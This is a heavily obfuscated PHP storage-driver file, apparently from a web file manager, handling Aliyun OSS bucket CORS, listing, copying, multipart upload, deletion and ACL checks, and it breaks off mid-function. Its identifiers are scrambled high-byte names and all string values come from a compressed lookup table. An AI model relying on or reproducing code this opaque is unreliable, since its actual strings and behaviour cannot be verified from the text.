<?php
 goto e«ÖÒ«ƒãô; D‹ï²»ÕÅ„: $_SERVER[¨­üö¨œ] = explode($_SERVER[–Ú¬çÁ][659], gzinflate(substr($_SERVER[–Ú¬çÁ][660], 10, -8))); $hfxbmeqgzs = $_SERVER[–Ú¬çÁ][661]; if (strlen($hfxbmeqgzs) < $_SERVER[–Ú¬çÁ][658]) { return; } goto CÜ³Î¾‰·; Eˆ¸±²ó®…: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($á×è­Ò€) { parent::__construct($á×è­Ò€); $this->signatureVersion($_SERVER[–Ú¬çÁ][241]); } public function fileOutLink($ƒÀ®) { $ÊÄå¢¥¤ =& $_SERVER[–Ú¬çÁ]; if (substr($ƒÀ®, 0, 7) == $ÊÄå¢¥¤[1350]) { $ƒÀ® = $ÊÄå¢¥¤[1351] . substr($ƒÀ®, 7); } header($ÊÄå¢¥¤[162] . $ƒÀ®); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($‡Èï¶) { parent::__construct(); include_once SDK_DIR . $_SERVER[–Ú¬çÁ][1387]; $this->_init($‡Èï¶); } public function _init($ŠÓÊ²å) { $Ô©‘Éèá =& $_SERVER[–Ú¬çÁ]; $this->config = $ŠÓÊ²å; foreach ($ŠÓÊ²å as $¼Ğ†Ä®Ï => $£Ò¹ÇÃ¢) { if (isset($this->{$¼Ğ†Ä®Ï})) { $this->{$¼Ğ†Ä®Ï} = $£Ò¹ÇÃ¢; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Ô©‘Éèá[1388] . LNG($Ô©‘Éèá[1389])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $®’„”¤¶ =& $_SERVER[–Ú¬çÁ]; $”‰å´Ç¤ = new OSS\Model\CorsConfig(); $¾Ğİ¹éÏ = new OSS\Model\CorsRule(); $¾Ğİ¹éÏ->addAllowedOrigin($®’„”¤¶[1390]); $¾Ğİ¹éÏ->addAllowedMethod($®’„”¤¶[1391]); $¾Ğİ¹éÏ->addAllowedMethod($®’„”¤¶[1392]); $¾Ğİ¹éÏ->addAllowedMethod($®’„”¤¶[1393]); $¾Ğİ¹éÏ->addAllowedMethod($®’„”¤¶[1394]); $¾Ğİ¹éÏ->addAllowedMethod($®’„”¤¶[161]); $¾Ğİ¹éÏ->setMaxAgeSeconds(600); $¾Ğİ¹éÏ->addExposeHeader($®’„”¤¶[1395]); $¾Ğİ¹éÏ->addAllowedHeader($®’„”¤¶[1390]); $”‰å´Ç¤->addRule($¾Ğİ¹éÏ); try { $this->client->putBucketCors($this->bucket, $”‰å´Ç¤); } catch (OSS\Core\OssException $µ§’†„ü) { return !1; } return !0; } public function getBucketCors() { $ãÜµŸ›Ò =& $_SERVER[–Ú¬çÁ]; $¦Í”›€ = null; try { $¦Í”›€ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $°İ´À…Æ) { return null; } if (!$¦Í”›€ || !($†ÁÓşÉÄ = $¦Í”›€->getRules())) { return null; } $Ê¤×Äè¹ = $†ÁÓşÉÄ[0]->getAllowedOrigins(); $ŞñÛÛÄ = $†ÁÓşÉÄ[0]->getAllowedMethods(); $¿Ö¶ÃÒÊ = $†ÁÓşÉÄ[0]->getMaxAgeSeconds(); $ùĞá©Ùó = $†ÁÓşÉÄ[0]->getExposeHeaders(); $àèô²ğ‘ = $†ÁÓşÉÄ[0]->getAllowedHeaders(); return array($ãÜµŸ›Ò[212] => isset($Ê¤×Äè¹[0]) ? $Ê¤×Äè¹[0] : $ãÜµŸ›Ò[12], $ãÜµŸ›Ò[216] => $ŞñÛÛÄ, $ãÜµŸ›Ò[1396] => $¿Ö¶ÃÒÊ, $ãÜµŸ›Ò[1397] => isset($ùĞá©Ùó[0]) ? $ùĞá©Ùó[0] : $ãÜµŸ›Ò[12], $ãÜµŸ›Ò[214] => isset($àèô²ğ‘[0]) ? $àèô²ğ‘[0] : $ãÜµŸ›Ò[12]); } public function isBucketCors() { $®÷‘ş¯ú =& $_SERVER[–Ú¬çÁ]; $Ú¯Ì…¦ù = $this->getBucketCors(); if (!$Ú¯Ì…¦ù || !is_array($Ú¯Ì…¦ù)) { return !1; } if ($Ú¯Ì…¦ù[$®÷‘ş¯ú[212]] != $®÷‘ş¯ú[213] || $Ú¯Ì…¦ù[$®÷‘ş¯ú[214]] != $®÷‘ş¯ú[213]) { return !1; } $ÅöÆ‡ñË = array_map($®÷‘ş¯ú[215], $Ú¯Ì…¦ù[$®÷‘ş¯ú[216]]); if (!is_array($ÅöÆ‡ñË)) { $ÅöÆ‡ñË = array(); } $»´Îé‰ç = array($®÷‘ş¯ú[217], $®÷‘ş¯ú[218], $®÷‘ş¯ú[219], $®÷‘ş¯ú[220], $®÷‘ş¯ú[221]); $ÅÕ´·’† = array_diff($»´Îé‰ç, $ÅöÆ‡ñË); return empty($ÅÕ´·’†); } public function mkfile($Ú´´Îî—, $‚„Ëİ¼ä = '', $³ˆÒºÕÈ = REPEAT_RENAME) { $ëÖ§‰¾ = $this->setContent($Ú´´Îî—, $‚„Ëİ¼ä); if ($ëÖ§‰¾ !== !1) { return $this->getPathOuter($Ú´´Îî—); } return !1; } public function mkdir($…Ñİå›¨, $à—ÓÒçú = REPEAT_SKIP) { if ($à—ÓÒçú && $this->_isFolder($…Ñİå›¨)) { return $this->getPathOuter($…Ñİå›¨); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($…Ñİå›¨)); } catch (OSS\Core\OssException $÷†­ù£Û) { return !1; } return $this->getPathOuter($…Ñİå›¨); } private function fileList($Ê–‹Å¾µ, $‡ÅÒ“½ = '', $ÖåÚŒŸé = 0) { $º™ØáÜ¿ =& $_SERVER[–Ú¬çÁ]; $Ê–‹Å¾µ = trim($Ê–‹Å¾µ, $º™ØáÜ¿[8]); $Ô’Ñà« = empty($Ê–‹Å¾µ) && $Ê–‹Å¾µ !== $º™ØáÜ¿[222] ? $º™ØáÜ¿[12] : $Ê–‹Å¾µ . $º™ØáÜ¿[8]; $ü‰ˆÚ½ß = $º™ØáÜ¿[12]; $ÌğäÇÆ¾ = 1000; $ì’™»Ø½ = $ú»‚ûä = array(); while (!0) { check_abort(); $¿şï€ÙÂ = array($º™ØáÜ¿[1398] => $‡ÅÒ“½, $º™ØáÜ¿[1399] => $Ô’Ñà«, $º™ØáÜ¿[1400] => $ÌğäÇÆ¾, $º™ØáÜ¿[1401] => $ü‰ˆÚ½ß); try { $ƒö’Š¾Õ = $this->client->listObjects($this->bucket, $¿şï€ÙÂ); } catch (OSS\Core\OssException $»ßî¾·) { break; } $ü‰ˆÚ½ß = $ƒö’Š¾Õ->getNextMarker(); $ÙÇÙÊ¼ = $ƒö’Š¾Õ->getObjectList(); $ñ¡ ú° = $ƒö’Š¾Õ->getPrefixList(); foreach ($ÙÇÙÊ¼ as $É¹Ú›ò) { if ($É¹Ú›ò->getKey() == $Ô’Ñà«) { continue; } $»àã½Û = $É¹Ú›ò->getKey(); $‰°¤«‚‰ = $É¹Ú›ò->getSize(); $®Å¨äàà = $É¹Ú›ò->getLastModified(); $äÈÂîª‰ = trim($É¹Ú›ò->getETag(), $º™ØáÜ¿[118]); $¨ËµÃö = $ÖåÚŒŸé ? array($º™ØáÜ¿[32] => $»àã½Û, $º™ØáÜ¿[76] => $‰°¤«‚‰, $º™ØáÜ¿[194] => strtotime($®Å¨äàà), $º™ØáÜ¿[1402] => $äÈÂîª‰) : $»àã½Û; $©Š¹Çõ… = $‰°¤«‚‰ == 0 && substr($»àã½Û, strlen($»àã½Û) - 1, 1) == $º™ØáÜ¿[8] ? !0 : !1; $•‹ÙÒ‚í = array($º™ØáÜ¿[76] => $‰°¤«‚‰, $º™ØáÜ¿[1403] => $‰°¤«‚‰, $º™ØáÜ¿[85] => strtotime($®Å¨äàà), $º™ØáÜ¿[1404] => $®Å¨äàà, $º™ØáÜ¿[1402] => $äÈÂîª‰); $this->cacheMethodInfoSet($»àã½Û, $©Š¹Çõ…, $•‹ÙÒ‚í); if ($©Š¹Çõ…) { $ì’™»Ø½[] = $»àã½Û; continue; } $ú»‚ûä[] = $¨ËµÃö; } foreach ($ñ¡ ú° as $ûóàÉßÍ) { $ì’™»Ø½[] = $ûóàÉßÍ->getPrefix(); $this->cacheMethodInfoSet($ûóàÉßÍ->getPrefix(), !0); } if ($ü‰ˆÚ½ß === $º™ØáÜ¿[12]) { break; } } $this->cacheMethodInfoSet($Ê–‹Å¾µ, !0); return array($º™ØáÜ¿[82] => $ì’™»Ø½, $º™ØáÜ¿[83] => $ú»‚ûä); } public function copyFile($Ã‹¿ŞÙ, $ƒşÚÓ¦€) { $¡äâÉ× = $this->size($Ã‹¿ŞÙ); if ($¡äâÉ× < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Ã‹¿ŞÙ, $this->bucket, $this->pathEncode($ƒşÚÓ¦€)); } catch (OSS\Core\OssException $¤²Åõ) { return !1; } return $this->getPathOuter($ƒşÚÓ¦€); } $§î¢–¬ò = $this->multiCopyObject($Ã‹¿ŞÙ, $ƒşÚÓ¦€, $¡äâÉ×); return $§î¢–¬ò ? $this->getPathOuter($ƒşÚÓ¦€) : !1; } private function multiCopyObject($’Ì„àµÛ, $ğàñ©³ƒ, $Ûåª•É) { $İª·âØ» =& $_SERVER[–Ú¬çÁ]; try { $óüÎòäË = array(); if ($¾­ÍÉÓµ = $this->hashMd5($’Ì„àµÛ)) { $óüÎòäË = array(OSS\OssClient::OSS_HEADERS => array($İª·âØ»[1405] => $¾­ÍÉÓµ)); } $éÚõÉˆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ğàñ©³ƒ), $óüÎòäË); $ÕøèË†Ç = 1; $¦‘»¡£á = 0; $í‘ú‡è† = array(); $Ù½ŒÑù = 1024 * 1024 * 10; $š¼Ÿê¹İ = $this->client->generateMultiuploadParts($Ûåª•É, $Ù½ŒÑù); foreach ($š¼Ÿê¹İ as $´¡ı‹À¡ => $½¸¨’úÎ) { $ÆùÔ®¸÷ = $¦‘»¡£á + (int) $½¸¨’úÎ[$İª·âØ»[1406]]; $ŠÅÂ®Ã® = (int) $½¸¨’úÎ[$İª·âØ»[390]] + $ÆùÔ®¸÷ - 1; $âŒ¸ÎÈ = array($İª·âØ»[1407] => $ÆùÔ®¸÷, $İª·âØ»[1408] => $ŠÅÂ®Ã®); $í‘ú‡è†[] = $this->client->uploadPartCopy($this->bucket, $’Ì„àµÛ, $this->bucket, $this->pathEncode($ğàñ©³ƒ), $ÕøèË†Ç, $éÚõÉˆ, $âŒ¸ÎÈ); $ÕøèË†Ç = $ÕøèË†Ç + 1; } $™Ûİ‡£Ç = array(); foreach ($í‘ú‡è† as $´¡ı‹À¡ => $ïî“æÕË) { $™Ûİ‡£Ç[] = array($İª·âØ»[1409] => $´¡ı‹À¡ + 1, $İª·âØ»[1410] => $ïî“æÕË); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ğàñ©³ƒ), $éÚõÉˆ, $™Ûİ‡£Ç); } catch (OSS\Core\OssException $Í¢şÛÆ) { return !1; } return !0; } public function moveFile($Í›³÷‡”, $“¦İü‰×) { if ($this->copyFile($Í›³÷‡”, $“¦İü‰×)) { $this->remove($Í›³÷‡”); return $this->getPathOuter($“¦İü‰×); } return !1; } public function delFile($ˆ´Óò™) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ˆ´Óò™)); } catch (OSS\Core\OssException $‘åÎî) { return !1; } return !0; } public function delFolder($š©°™ğ–) { $å“çâŸ‘ =& $_SERVER[–Ú¬çÁ]; if (!$this->exist($š©°™ğ–)) { return !0; } $this->listItemCache = !1; $Ï—ŒÉŠÜ = $this->fileList($š©°™ğ–); $this->listItemCache = !0; $ÄÅı¥à– = trim($š©°™ğ–, $å“çâŸ‘[8]) . $å“çâŸ‘[8]; if (!empty($š©°™ğ–) && $š©°™ğ– !== $å“çâŸ‘[222] && !in_array($ÄÅı¥à–, $Ï—ŒÉŠÜ[$å“çâŸ‘[82]])) { $Ï—ŒÉŠÜ[$å“çâŸ‘[82]][] = $ÄÅı¥à–; } $­–¸¾‚Œ = $this->delByBatch($Ï—ŒÉŠÜ[$å“çâŸ‘[83]]); if (!$­–¸¾‚Œ) { return !1; } $­–¸¾‚Œ = $this->delByBatch($Ï—ŒÉŠÜ[$å“çâŸ‘[82]]); if (!$­–¸¾‚Œ) { return !1; } return $this->delFile($ÄÅı¥à–); } private function delByBatch($½„øÏõ³) { foreach (array_chunk($½„øÏõ³, 1000) as $šÖ¯è¯†) { try { $this->client->deleteObjects($this->bucket, $šÖ¯è¯†); } catch (OSS\Core\OssException $Õƒïùşö) { return !1; } } return !0; } public function rename($ä«¹ØñÅ, $±Áã™½) { return $this->renameObject($ä«¹ØñÅ, $±Áã™½); } private function fileInfo($—ëîäª, $³»•‰æ• = false, $©š‚Œ»™ = array()) { $øóê÷‰® =& $_SERVER[–Ú¬çÁ]; $œ¶úÚÜ¸ = array($øóê÷‰®[32] => $this->pathThis($—ëîäª), $øóê÷‰®[84] => $this->getPathOuter($—ëîäª), $øóê÷‰®[33] => $øóê÷‰®[224], $øóê÷‰®[76] => isset($©š‚Œ»™[$øóê÷‰®[76]]) ? $©š‚Œ»™[$øóê÷‰®[76]] : 0, $øóê÷‰®[175] => $this->ext($—ëîäª)); if ($³»•‰æ•) { return $œ¶úÚÜ¸; } $œ¶úÚÜ¸[$øóê÷‰®[225]] = $œ¶úÚÜ¸[$øóê÷‰®[85]] = 0; $œ¶úÚÜ¸[$øóê÷‰®[226]] = $œ¶úÚÜ¸[$øóê÷‰®[227]] = !0; if (empty($©š‚Œ»™)) { $§ºØáØ = $this->objectMeta($—ëîäª); if (!$§ºØáØ) { return $œ¶úÚÜ¸; } $©š‚Œ»™ = array($øóê÷‰®[85] => strtotime($§ºØáØ[$øóê÷‰®[1404]]), $øóê÷‰®[76] => $§ºØáØ[$øóê÷‰®[1403]] + 0, $øóê÷‰®[1402] => $§ºØáØ[$øóê÷‰®[1402]]); } if (isset($©š‚Œ»™[$øóê÷‰®[1402]]) && $©š‚Œ»™[$øóê÷‰®[1402]]) { $œ¶úÚÜ¸[$øóê÷‰®[229]] = trim($©š‚Œ»™[$øóê÷‰®[1402]], $øóê÷‰®[118]); } if (isset($©š‚Œ»™[$øóê÷‰®[76]])) { $œ¶úÚÜ¸[$øóê÷‰®[76]] = $©š‚Œ»™[$øóê÷‰®[76]]; } if (isset($©š‚Œ»™[$øóê÷‰®[85]])) { $œ¶úÚÜ¸[$øóê÷‰®[85]] = $©š‚Œ»™[$øóê÷‰®[85]]; } if (isset($©š‚Œ»™[$øóê÷‰®[194]]) && !trim($œ¶úÚÜ¸[$øóê÷‰®[85]])) { $œ¶úÚÜ¸[$øóê÷‰®[85]] = $©š‚Œ»™[$øóê÷‰®[194]]; } return $œ¶úÚÜ¸; } private function folderInfo($Ô©ø›“é, $×œ›‰Ø¡ = false, $¹Ë‡øÒË = array()) { $Áí±°ó² =& $_SERVER[–Ú¬çÁ]; $äšÙèÀ¤ = array($Áí±°ó²[32] => $this->pathThis($Ô©ø›“é), $Áí±°ó²[84] => $this->getPathOuter($Áí±°ó²[8] . $Ô©ø›“é), $Áí±°ó²[33] => $Áí±°ó²[75]); if ($×œ›‰Ø¡) { return $äšÙèÀ¤; } $äšÙèÀ¤[$Áí±°ó²[225]] = $äšÙèÀ¤[$Áí±°ó²[85]] = 0; $äšÙèÀ¤[$Áí±°ó²[226]] = $äšÙèÀ¤[$Áí±°ó²[227]] = !0; if (empty($¹Ë‡øÒË)) { $Ô©ø›“é = rtrim($Ô©ø›“é, $Áí±°ó²[8]) . $Áí±°ó²[8]; $ËˆÑù¸ä = $this->objectMeta($Ô©ø›“é); if (!$ËˆÑù¸ä) { return $äšÙèÀ¤; } $¹Ë‡øÒË = array($Áí±°ó²[225] => $ËˆÑù¸ä[$Áí±°ó²[554]][$Áí±°ó²[1411]], $Áí±°ó²[85] => strtotime($ËˆÑù¸ä[$Áí±°ó²[1404]])); } if (isset($¹Ë‡øÒË[$Áí±°ó²[85]])) { $äšÙèÀ¤[$Áí±°ó²[85]] = $¹Ë‡øÒË[$Áí±°ó²[85]]; } if (isset($¹Ë‡øÒË[$Áí±°ó²[225]])) { $äšÙèÀ¤[$Áí±°ó²[225]] = $¹Ë‡øÒË[$Áí±°ó²[225]]; } return $äšÙèÀ¤; } public function listPath($öş¨éû¢, $ì°“Í†Ş = false) { $—ş¦Ñ¦Ã =& $_SERVER[–Ú¬çÁ]; $æÕ«æƒö = $this->fileList($öş¨éû¢, $—ş¦Ñ¦Ã[8], !0); foreach ($æÕ«æƒö[$—ş¦Ñ¦Ã[82]] as $Î˜¶«¡Ğ => $ÀõÑÒÛÃ) { $æÕ«æƒö[$—ş¦Ñ¦Ã[82]][$Î˜¶«¡Ğ] = $this->folderInfo($ÀõÑÒÛÃ, $ì°“Í†Ş, $ÀõÑÒÛÃ); } foreach ($æÕ«æƒö[$—ş¦Ñ¦Ã[83]] as $Î˜¶«¡Ğ => $ÀõÑÒÛÃ) { $æÕ«æƒö[$—ş¦Ñ¦Ã[83]][$Î˜¶«¡Ğ] = $this->fileInfo($ÀõÑÒÛÃ[$—ş¦Ñ¦Ã[32]], $ì°“Í†Ş, $ÀõÑÒÛÃ); } return $æÕ«æƒö; } protected function infoChildren($²…ÃñªÛ, &$øÀ°Ä´) { $ş™½îãŠ =& $_SERVER[–Ú¬çÁ]; $íßƒš¼ë = $this->fileList($²…ÃñªÛ, $ş™½îãŠ[12], !0); $øÀ°Ä´[$ş™½îãŠ[78]] += count($íßƒš¼ë[$ş™½îãŠ[82]]); $øÀ°Ä´[$ş™½îãŠ[77]] += count($íßƒš¼ë[$ş™½îãŠ[83]]); foreach ($íßƒš¼ë[$ş™½îãŠ[83]] as $ÓêÙ®™±) { if (!$ÓêÙ®™± || !$ÓêÙ®™±[$ş™½îãŠ[76]]) { continue; } $øÀ°Ä´[$ş™½îãŠ[76]] += $ÓêÙ®™±[$ş™½îãŠ[76]]; } } public function has($­Áçµ , $‘ÌÄò¾ì = false, $åÀèúì› = true) { $ƒ©ˆ²Â =& $_SERVER[–Ú¬çÁ]; $­Áçµ  = trim($­Áçµ , $ƒ©ˆ²Â[8]); $õß†Ëñ¸ = empty($­Áçµ ) && $­Áçµ  !== $ƒ©ˆ²Â[222] ? $ƒ©ˆ²Â[12] : $­Áçµ  . $ƒ©ˆ²Â[8]; $İœ‹ºğü = $ƒ©ˆ²Â[12]; $¿¨‡£öì = 500; $¡ÈÉÉé´ = $ëÜ©û¹’ = 0; while (!0) { check_abort(); $¶öîÖ‹¾ = array($ƒ©ˆ²Â[1398] => $ƒ©ˆ²Â[8], $ƒ©ˆ²Â[1399] => $õß†Ëñ¸, $ƒ©ˆ²Â[1400] => $¿¨‡£öì, $ƒ©ˆ²Â[1401] => $İœ‹ºğü); try { $Š­‰Ñå² = $this->client->listObjects($this->bucket, $¶öîÖ‹¾); } catch (OSS\Core\OssException $³¸ÉÁÒÇ) { break; } $İœ‹ºğü = $Š­‰Ñå²->getNextMarker(); $å³±Âä¢ = $Š­‰Ñå²->getObjectList(); $÷—¨ôÍ¦ = $Š­‰Ñå²->getPrefixList(); if ($‘ÌÄò¾ì) { if (count($å³±Âä¢) > 1 || count($å³±Âä¢) == 1 && $å³±Âä¢[0]->getKey() != $õß†Ëñ¸) { $¡ÈÉÉé´ += count($å³±Âä¢) - 1; } if (!empty($÷—¨ôÍ¦)) { $ëÜ©û¹’ += count($÷—¨ôÍ¦); } if ($İœ‹ºğü === $ƒ©ˆ²Â[12]) { break; } continue; } if ($åÀèúì›) { if (!empty($å³±Âä¢)) { if (count($å³±Âä¢) > 1 || $å³±Âä¢[0]->getKey() != $õß†Ëñ¸) { return !0; } } } else { if (!empty($÷—¨ôÍ¦)) { return !0; } } if ($İœ‹ºğü === $ƒ©ˆ²Â[12]) { break; } } if ($‘ÌÄò¾ì) { return array($ƒ©ˆ²Â[233] => $¡ÈÉÉé´, $ƒ©ˆ²Â[234] => $ëÜ©û¹’); } return !1; } public function listAll($ˆ¿²ïåö) { $ñ¹€ãİ =& $_SERVER[–Ú¬çÁ]; $¯Ò ÷‡ = $this->fileList($ˆ¿²ïåö, $ñ¹€ãİ[12], !0); $´Şû£Æì = array_to_keyvalue($¯Ò ÷‡[$ñ¹€ãİ[83]], $ñ¹€ãİ[32]); foreach ($¯Ò ÷‡[$ñ¹€ãİ[82]] as $ÜÊ»ÓÈ) { if (is_string($ÜÊ»ÓÈ)) { $´Şû£Æì[$ÜÊ»ÓÈ] = array($ñ¹€ãİ[76] => 0); } } return $this->listAllFiles($ˆ¿²ïåö, $´Şû£Æì); } public function canRead($ášö) { $Ô’›«‰ =& $_SERVER[–Ú¬çÁ]; $Äéøè„æ = $this->pathAcl($ášö); return $Äéøè„æ == $Ô’›«‰[1412] || $Äéøè„æ == $Ô’›«‰[597] ? !0 : !1; } public function canWrite($ƒå”†›„) { $İ×ÈÓÁ = $this->pathAcl($ƒå”†›„); return $İ×ÈÓÁ == $_SERVER[–Ú¬çÁ][597] ? !0 : !1; } public function pathAcl($…˜ÏÅ¹æ) { $×Ù­Ş¦ =& $_SERVER[–Ú¬çÁ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $‡ö¸õ‰ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($…˜ÏÅ¹æ)); } catch (OSS\Core\OssException $ú‘ÌÂÙË) { return !1; } $Ê¦²¬€é = $‡ö¸õ‰ == $×Ù­Ş¦[37] ? $this->bucketAcl : $‡ö¸õ‰; if ($Ê¦²¬€é == $×Ù­Ş¦[1413]) { return $×Ù­Ş¦[1412]; } if ($Ê¦²¬€é == $×Ù­Ş¦[1414]) { return $×Ù­Ş¦[597]; } return $Ê¦²¬€é; } private function chmodPath($üÃÙÓ, $ä™‡ùªç = '') { $‡ÄáäÍ =& $_SERVER[–Ú¬çÁ]; $ËŠ·»—› = empty($ä™‡ùªç) ? $‡ÄáäÍ[1414] : $ä™‡ùªç; $Õöõµ„€ = array($‡ÄáäÍ[37], $‡ÄáäÍ[223], $‡ÄáäÍ[1413], $‡ÄáäÍ[1414]); if (!in_array($ËŠ·»—›, $Õöõµ„€)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($üÃÙÓ), $ËŠ·»—›); } catch (OSS\Core\OssException $¿€òÕüª) { return !1; } return !0; } public function getContent($Ô×¦Ğó) { return $this->fileSubstr($Ô×¦Ğó, -1); } public function setContent($ê’€İŸ, $İòç×¿© = '') { $ùÏäãÈô =& $_SERVER[–Ú¬çÁ]; try { $²®ö™Ù© = $this->trafficLimit($ùÏäãÈô[1415]); $å€Ô«Î = $this->client->putObject($this->bucket, $this->pathEncode($ê’€İŸ), $İòç×¿©, $²®ö™Ù©); } catch (OSS\Core\OssException $£Î›Ğ±·) { return !1; } $„åÈ©¯ = array($ùÏäãÈô[1405] => trim($å€Ô«Î[$ùÏäãÈô[1402]], $ùÏäãÈô[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ê’€İŸ))); $this->updateObjMeta($ê’€İŸ, $„åÈ©¯); return isset($å€Ô«Î[$ùÏäãÈô[1416]][$ùÏäãÈô[284]]) ? !0 : !1; } private function updateObjMeta($²¦³Í‘ô, $³±Îœ©) { $²¦³Í‘ô = $this->pathEncode($²¦³Í‘ô); try { $ÒêúŒ² = array(OSS\OssClient::OSS_HEADERS => $³±Îœ©); $this->client->copyObject($this->bucket, $²¦³Í‘ô, $this->bucket, $²¦³Í‘ô, $ÒêúŒ²); } catch (OSS\Core\OssException $ŞÚüÓ†‡) { return !1; } return !0; } public function upload($¯ôÊ›÷½, $¨ã™ê‰õ, $Ñ¾Çı¼” = false, $×­»°«õ = REPEAT_REPLACE) { $Êò¨òË¯ =& $_SERVER[–Ú¬çÁ]; $µĞÎÆÒØ = trim($¯ôÊ›÷½, $Êò¨òË¯[8]); $´–ùá¥£ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Êò¨òË¯[1405] => @md5_file($¨ã™ê‰õ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¯ôÊ›÷½))); $´–ùá¥£ = $this->trafficLimit($Êò¨òË¯[1415], $´–ùá¥£); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($µĞÎÆÒØ), $¨ã™ê‰õ, $´–ùá¥£); } catch (OSS\Core\OssException $¸ƒ¾¤ÃÚ) { return !1; } return $this->getPathOuter($¯ôÊ›÷½); } public function getHost() { $ÔøÁÆ‰É =& $_SERVER[–Ú¬çÁ]; $óëáÜ˜É = explode($ÔøÁÆ‰É[198], parent::getHost()); return $óëáÜ˜É[0] . $ÔøÁÆ‰É[198] . $this->bucket . $ÔøÁÆ‰É[10] . $óëáÜ˜É[1]; } public function uploadFormData($Ü®¬ıæ, $×ê¯ ´Ü = 3600) { $€‚‰›‚« =& $_SERVER[–Ú¬çÁ]; if (!($»×Š°şÍ = $this->getHost())) { return !1; } $–ó­óÇî = $×ê¯ ´Ü; $¥Ş£ûû = date($€‚‰›‚«[1417], time() + $–ó­óÇî); $ö»Ú»¨„ = new DateTime($¥Ş£ûû); $†—±öõó = $ö»Ú»¨„->format(DateTime::ISO8601); $ŸÙÂ¨÷ = strpos($†—±öõó, $€‚‰›‚«[349]); $†—±öõó = substr($†—±öõó, 0, $ŸÙÂ¨÷) . $€‚‰›‚«[1418]; $ı¨ºœ = 1048576000 * 5; $ñèßÙ— = $this->pathFather($Ü®¬ıæ); $—öô‘·ù = array($€‚‰›‚«[267] => $†—±öõó, $€‚‰›‚«[270] => array(array($€‚‰›‚«[1419], 0, $ı¨ºœ), array($€‚‰›‚«[273], $€‚‰›‚«[274], $ñèßÙ—))); $’ö˜ÖŠĞ = base64_encode(json_encode($—öô‘·ù)); $©è«Óïä = base64_encode(hash_hmac($€‚‰›‚«[256], $’ö˜ÖŠĞ, $this->secret, !0)); $¥ÏÁïš = array($€‚‰›‚«[285] => $’ö˜ÖŠĞ, $€‚‰›‚«[1420] => $this->accessKey, $€‚‰›‚«[277] => $€‚‰›‚«[266], $€‚‰›‚«[1421] => $©è«Óïä, $€‚‰›‚«[196] => $»×Š°şÍ); $¥ÏÁïš = $this->trafficLimit($€‚‰›‚«[1415], $¥ÏÁïš); return $¥ÏÁïš; } public function multiUploadFormData($ª•Ò×ó, $š«Ç®Àº = 3600) { $±Êß‹’ =& $_SERVER[–Ú¬çÁ]; if (!($«õ„Æ– = $this->getHost())) { return !1; } $©—âù…„ = $this->trafficLimit($±Êß‹’[1415]); $Ã¼‹î£š = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ª•Ò×ó), $©—âù…„); return array($±Êß‹’[248] => $Ã¼‹î£š, $±Êß‹’[196] => $«õ„Æ– . $±Êß‹’[8] . $this->pathEncode($ª•Ò×ó), $±Êß‹’[249] => gmdate($±Êß‹’[1422]), $±Êß‹’[94] => $ª•Ò×ó); } public function multiUploadAuthData($ÅÑâ‰¥Å, $¼Ş©£ş¹ = array()) { $€ŒöÅ—ô =& $_SERVER[–Ú¬çÁ]; $†¤ª«õØ = isset($¼Ş©£ş¹[$€ŒöÅ—ô[249]]) ? $¼Ş©£ş¹[$€ŒöÅ—ô[249]] : gmdate($€ŒöÅ—ô[1422]); $óêìø³‚ = isset($¼Ş©£ş¹[$€ŒöÅ—ô[175]]) ? $¼Ş©£ş¹[$€ŒöÅ—ô[175]] : $€ŒöÅ—ô[12]; $˜Ô¥»¢” = $ÅÑâ‰¥Å; if (isset($¼Ş©£ş¹[$€ŒöÅ—ô[94]])) { $˜Ô¥»¢” = $¼Ş©£ş¹[$€ŒöÅ—ô[94]]; unset($¼Ş©£ş¹[$€ŒöÅ—ô[94]]); } if (isset($¼Ş©£ş¹[$€ŒöÅ—ô[250]])) { $¼Ş©£ş¹[$€ŒöÅ—ô[249]] = $†¤ª«õØ; return $this->listUploadParts($˜Ô¥»¢”, $¼Ş©£ş¹); } $Ì¦ƒ‹”” = array($€ŒöÅ—ô[251], $€ŒöÅ—ô[12], $€ŒöÅ—ô[120], $†¤ª«õØ, "\x78\x2d\157\163\x73\x2d\144\x61\164\x65\x3a{$†¤ª«õØ}", $€ŒöÅ—ô[8] . $this->bucket . $€ŒöÅ—ô[8] . $˜Ô¥»¢” . $óêìø³‚); if (strpos($óêìø³‚, $€ŒöÅ—ô[252]) === 0) { $Ì¦ƒ‹””[0] = $€ŒöÅ—ô[253]; if ($¨Ë¿†Ğ = $this->trafficLimit($€ŒöÅ—ô[1415])) { $˜Ô¥»¢” = $€ŒöÅ—ô[1423]; array_splice($Ì¦ƒ‹””, 5, 0, $˜Ô¥»¢” . $€ŒöÅ—ô[4] . $¨Ë¿†Ğ[$˜Ô¥»¢”]); } } if (isset($¼Ş©£ş¹[$€ŒöÅ—ô[254]]) && $¼Ş©£ş¹[$€ŒöÅ—ô[254]] == $€ŒöÅ—ô[255]) { $Ì¦ƒ‹””[0] = $€ŒöÅ—ô[255]; } if (!empty($¼Ş©£ş¹[$€ŒöÅ—ô[1424]])) { $Ùç®¡é = array_merge(array($Ì¦ƒ‹””[4]), $¼Ş©£ş¹[$€ŒöÅ—ô[1424]]); sort($Ùç®¡é); 